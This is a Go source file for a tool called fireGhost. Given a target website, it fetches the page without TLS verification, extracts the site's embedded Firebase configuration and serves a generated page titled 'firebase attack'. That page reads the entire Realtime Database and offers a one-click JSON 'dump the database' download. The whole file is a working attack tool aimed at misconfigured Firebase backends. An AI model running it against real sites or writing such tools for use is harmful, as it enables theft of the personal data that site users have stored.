package main

import (
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"text/template"
	"time"
)

type fireGhost struct {
	err           error
	printToStdout bool
	serveHTTP     bool
	target        string
	body          []byte
	result        string
	port          int
}

func main() {
	fire := new(fireGhost)
	fire.parseFlags().
		fetchTarget().
		hasFirebase().
		grabConfig().
		printConfig().
		saveFile().
		serveFile()
	if fire.err != nil {
		fmt.Println(fire.err)
	}
}

// parseFlags parses flags.
// and decides what to do
func (fire *fireGhost) parseFlags() *fireGhost {
	if fire.err != nil {
		return fire
	}
	// define flags
	flag.IntVar(&fire.port, "p", 1339, "port to listen.")
	flag.StringVar(&fire.target, "t", "", "target host.")
	flag.BoolVar(&fire.printToStdout, "w", true, "Print result to stdout")
	flag.BoolVar(&fire.serveHTTP, "s", true, "Serve the generated page.")
	// parse and return
	flag.Parse()
	return fire
}

// fetchTarget fetches the target
func (fire *fireGhost) fetchTarget() *fireGhost {
	if fire.err != nil {
		return fire
	}
	// validate target
	if fire.target == "" {
		fire.err = errors.New("Target can't be empty!")
		return fire
	}
	// ignore https cryoto errors
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	// custom http client
	client := http.Client{
		Timeout:   time.Minute,
		Transport: tr,
	}
	// Get the page
	var resp *http.Response
	resp, fire.err = client.Get(fire.target)
	if fire.err != nil {
		return fire
	}
	// read the response
	fire.body, fire.err = ioutil.ReadAll(resp.Body)
	if fire.err != nil {
		return fire
	}
	return fire
}

// hasFirebase checks if the target uses firebase
func (fire *fireGhost) hasFirebase() *fireGhost {
	if fire.err != nil {
		return fire
	}
	// regex to check firebase plugin
	updated, err := regexp.Compile(
		`<script src="https:\/\/www\.gstatic\.com\/firebasejs\/.*?\/firebase\.js"><\/script>`,
	)
	if err != nil {
		fire.err = err
		return fire
	}
	backdated, err := regexp.Compile(
		`<script.*?src=".*?\/firebase\.js"><\/script>`,
	)
	if err != nil {
		fire.err = err
		return fire
	}
	if updated.Match(fire.body) {
		return fire
	} else if backdated.Match(fire.body) {
		return fire
	}
	fire.err = errors.New("Target doesn't have firebase plugin!")
	return fire
}

// grabConfig grabs the configs
func (fire *fireGhost) grabConfig() *fireGhost {
	if fire.err != nil {
		return fire
	}
	// extract firebase config
	body := string(fire.body)
	s := strings.Index(
		body,
		"var config = {",
	)
	e := strings.Index(
		body,
		"firebase.initializeApp",
	)
	if s < 0 || e < 0 {
		fire.err = errors.New("Target uses firebase, but fireGhost couldn't grab the config")
		return fire
	}
	fire.result = fmt.Sprintf("%s%s",
		string(body[s:e]),
		"firebase.initializeApp(config);",
	)
	return fire
}

// printConfig saves and prints the config
func (fire *fireGhost) printConfig() *fireGhost {
	if fire.err != nil {
		return fire
	}
	if fire.printToStdout {
		fmt.Println(fire.result)
	}
	return fire
}

// saveFile saves the html file
func (fire *fireGhost) saveFile() *fireGhost {
	if fire.err != nil {
		return fire
	}
	file, err := os.Create(url.PathEscape(fire.target) + ".html")
	if err != nil {
		fire.err = err
		return fire
	}
	fire.generateHTML(file)
	return fire
}

// serveFile serves the html page
func (fire *fireGhost) serveFile() *fireGhost {
	if fire.err != nil {
		return fire
	}
	if !fire.serveHTTP {
		return fire
	}
	fmt.Printf("Serving on localhost:%d\n", fire.port)
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		fire.generateHTML(w)
		if fire.err != nil {
			fmt.Fprintln(w, fire.err)
		}
	})
	fire.err = http.ListenAndServe(fmt.Sprintf(":%d", fire.port), nil)
	return fire
}

// generateHTML generates html page
func (fire *fireGhost) generateHTML(w io.Writer) *fireGhost {
	if fire.err != nil {
		return fire
	}
	type Template struct {
		Host   string
		Config string
	}
	var tmpl = Template{
		Host:   fire.target,
		Config: fire.result,
	}
	page := `
<html>
   <head>
      <title>{{.Host}} || firebase attack</title>
      <script src="//cdn.jsdelivr.net/npm/eruda" onload="eruda.init()"></script>
      <meta name="viewport" content="initial-scale=1">
      <script src="https://www.gstatic.com/firebasejs/5.4.1/firebase-app.js"></script>
      <script src="https://www.gstatic.com/firebasejs/5.4.1/firebase-auth.js"></script>
      <script src="https://www.gstatic.com/firebasejs/5.4.1/firebase-database.js"></script>
   </head>
   <body>
	  <a style="font-size:300%; color:#333; text-decoration:none;" href="#" id="st">Connecting...</p>
      <body>
         <script>
            {{.Config}}
         </script>
         <script>
            function download(text, name, type) {
            var a = document.getElementById("st");
            var file = new Blob([text], {type: type});
            a.href = URL.createObjectURL(file);
            a.download = name;
            }
            var total = [];
            var query = firebase.database().ref().orderByKey();
            query.once("value")
            .then(function(snapshot) {
            document.getElementById("st").innerHTML="Getting Data...";
            var n = 0;
            snapshot.forEach(function(childSnapshot) {
            total.push(childSnapshot);
            n=n+1;
            return false;
            });
            document.getElementById("st").innerHTML= "Click me to dump the database"
            document.getElementById("st").onclick = function(){
            download(JSON.stringify(total), document.title+'.json', 'application/json')
            };
            })
            .catch(function(err){
            document.getElementById("st").innerHTML= err
            console.log(err)
            });
         </script>
	</body>
</html>
`
	t, err := template.New("todos").Parse(page)
	if err != nil {
		fire.err = err
		return fire
	}
	fire.err = t.Execute(w, tmpl)
	if fire.err != nil {
		return fire
	}
	return fire
}
